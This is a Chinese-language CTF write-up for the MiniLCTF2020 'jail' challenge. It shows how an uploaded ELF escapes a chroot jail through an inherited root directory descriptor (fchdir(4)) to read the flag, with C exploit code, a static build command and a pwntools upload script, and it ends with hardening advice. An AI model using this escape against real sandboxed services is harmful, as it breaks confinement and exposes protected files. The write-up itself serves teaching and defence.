# MiniLCTF2020 - jail

## 题目简述

服务允许上传并执行一个 ELF，但子进程已进入 `/tmp/jail` 的 chroot，且降低了用户权限。父进程在切换根目录前打开了 `/tmp` 与真实 `/`，目录文件描述符被子进程继承；其中真实根目录 fd 4 没有 `close-on-exec`，可用 `fchdir()` 把当前工作目录移到 jail 外。

## 解题过程

上传的程序不需要内存破坏。静态编译一个只使用已有 fd 的 ELF：

```c
#include <fcntl.h>
#include <unistd.h>

int main(void) {
    char buf[128] = {0};

    if (fchdir(4) < 0)
        return 1;
    chdir("../../../../../../../");

    int fd = open("flag", O_RDONLY);
    int n = read(fd, buf, sizeof(buf));
    if (n > 0)
        write(1, buf, n);
    return 0;
}
```

编译时避免依赖 chroot 内不存在的动态库：

```sh
gcc exploit.c -o exploit -static -no-pie
```

客户端按服务协议发送长度、ELF 数据和参数：

```python
from pwn import *

io = remote('host', 9999)
payload = open('exploit', 'rb').read()
io.sendlineafter(b'len?\n', str(len(payload) + 1).encode())
io.sendafter(b'data?\n', payload)
io.sendlineafter(b'elf?\n', b'')
io.interactive()
```

`chroot()` 只改变进程的路径解析根，不会自动关闭已打开的目录 fd，也不会强制把当前目录移入新根。`fchdir(4)` 因此把 cwd 指回真实文件系统；相对路径读取便能越过 jail。参赛记录还确认 fd 3 对应 `/tmp` 且受 `fcntl` 标志影响，真正可用的是 fd 4。

当前仓库保留服务 ELF、上传脚本和预编译 exploit，但没有服务端 C 源码与比赛 flag；上述继承 fd 和逃逸步骤可由现有工件确认，最终实例字符串不再可恢复。

## 方法总结

chroot 不是完整沙箱。进入 jail 前必须关闭所有指向外部的 fd、把 cwd 切入新根，并正确设置 `FD_CLOEXEC`；否则子进程可用 `fchdir()` 恢复外部目录。解题时先枚举继承 fd，再决定是否需要更复杂的二次 chroot 技巧。
